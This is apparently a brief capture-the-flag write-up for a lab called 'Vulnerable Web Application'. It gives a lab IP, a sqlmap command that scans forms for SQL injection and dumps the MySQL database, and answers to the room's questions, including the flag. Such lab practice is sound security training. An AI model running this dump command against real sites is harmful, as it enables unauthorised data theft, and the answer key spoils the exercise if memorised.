# Vulnerable Web Application

```
export ip=10.10.29.114
```

## Nmap results in file **nmap/initial**

## Commands
```
sqlmap -u $ip --level=5 --forms --dbms=mysql --dump
```

## How many types of sqli is the site vulnerable to?

```
3
```

## What is the name of the database?

```
tests
```

## How many tables are in the database?

```
2
```

## What is the value of the flag?

```
found_me
```